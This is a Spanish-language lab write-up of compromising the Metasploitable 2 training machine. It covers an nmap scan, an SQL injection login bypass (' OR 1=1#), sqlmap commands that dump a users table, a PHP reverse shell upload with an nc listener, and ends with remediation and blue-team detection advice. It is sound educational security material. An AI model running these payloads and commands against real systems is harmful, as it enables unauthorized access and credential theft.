# Metasploitable 2
# Web Application Exploitation – SQL Injection & Privilege Escalation

## 1. Resumen Ejecutivo

La máquina objetivo expone una base de datos MySQL accesible y una aplicación web vulnerable a inyección SQL.

Mediante la explotación de esta vulnerabilidad, fue posible obtener credenciales válidas, acceder al panel administrativo y ejecutar código en el sistema mediante la subida de una reverse shell.

El sistema fue completamente comprometido.

---

## 2. Alcance

- Objetivo: Metasploitable 2 (entorno laboratorio)
- Tipo de prueba: Evaluación de aplicación web
- Objetivo: Identificar vulnerabilidades y comprometer el sistema

---

## 3. Enumeración

Se realizó un escaneo completo de puertos:

```bash
nmap -p- -sS --min-rate 5000 -T4 -n -Pn <IP>
```

Puerto relevante detectado:

- 3306/tcp (MySQL)

Confirmación del servicio:

```bash
nmap -p3306 -sCV <IP>
```

---

## 4. Análisis de Superficie de Ataque

Se identificaron dos vectores principales:

- Base de datos MySQL accesible
- Aplicación web en puerto 80

La aplicación web presentaba un formulario de autenticación.

---

## 5. Identificación de Vulnerabilidades

### 5.1 SQL Injection

El formulario de login era vulnerable a inyección SQL.

Prueba:

```sql
' OR 1=1#
```

Permitía eludir la autenticación.

Tipo de vulnerabilidad:

- SQL Injection (Authentication Bypass)
- Falta de validación de entrada

---

## 6. Explotación

### 6.1 Automatización con SQLMap

Se interceptó la petición HTTP y se utilizó SQLMap:

```bash
sqlmap -r request.txt --dbs
```

Base de datos identificada:

- `doc`

Enumeración:

```bash
sqlmap -r request.txt -D doc --tables
sqlmap -r request.txt -D doc -T users --dump
```

Se obtuvieron credenciales válidas.

---

## 7. Acceso Inicial

Con las credenciales obtenidas:

- Se accedió al panel administrativo
- Se confirmaron privilegios elevados

---

## 8. Ejecución de Código

La aplicación permitía subida de archivos sin validación adecuada.

Se subió una reverse shell en PHP y se ejecutó:

```bash
nc -lvnp 8888
```

Se obtuvo acceso remoto al sistema.

---

## 9. Impacto

- Acceso remoto al sistema
- Ejecución de código arbitrario
- Compromiso completo de la máquina
- Acceso a datos sensibles

Impacto: Crítico

---

## 10. Recomendaciones

- Implementar validación de entradas
- Utilizar consultas preparadas (prepared statements)
- Restringir acceso a la base de datos
- Validar la subida de archivos
- Aplicar controles de autenticación robustos

---

## 11. Conclusión

Este laboratorio demuestra cómo una vulnerabilidad de SQL Injection puede derivar en un compromiso completo del sistema.

La cadena de ataque incluyó:

- SQL Injection
- Obtención de credenciales
- Acceso administrativo
- Ejecución remota de código

---

## 12. Conceptos Clave

- SQL Injection
- Authentication Bypass
- Explotación web
- Reverse Shell
- Control de acceso débil

---

## 13. Detección y Defensa (Blue Team Perspective)

Desde el punto de vista defensivo, esta actividad podría detectarse mediante:

- Registros de aplicación con consultas SQL anómalas (payloads como `' OR 1=1`)
- Múltiples intentos de autenticación fallidos o patrones sospechosos
- Uso de herramientas automatizadas (SQLMap) detectable por patrones de tráfico
- Subida de archivos no autorizados en el servidor web
- Conexiones salientes inusuales (reverse shell) desde el servidor hacia IP externas
- Actividad anómala en logs de Apache/Nginx

Medidas de detección recomendadas:

- Monitorización de logs de aplicación y base de datos
- Implementación de WAF (Web Application Firewall)
- Alertas por comportamiento anómalo en autenticación
- Supervisión de tráfico de red saliente
- Integración con SIEM (por ejemplo, Splunk) para correlación de eventos

---
